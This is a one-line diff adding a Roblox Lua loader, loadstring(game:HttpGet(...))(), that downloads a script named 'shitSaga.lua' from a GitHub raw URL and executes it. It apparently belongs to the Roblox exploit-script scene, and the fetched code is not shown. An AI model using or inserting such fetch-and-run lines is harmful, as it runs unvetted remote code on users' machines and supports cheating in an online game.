@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Eucalyptus69/shittyscripts/main/shitSaga.lua"))()
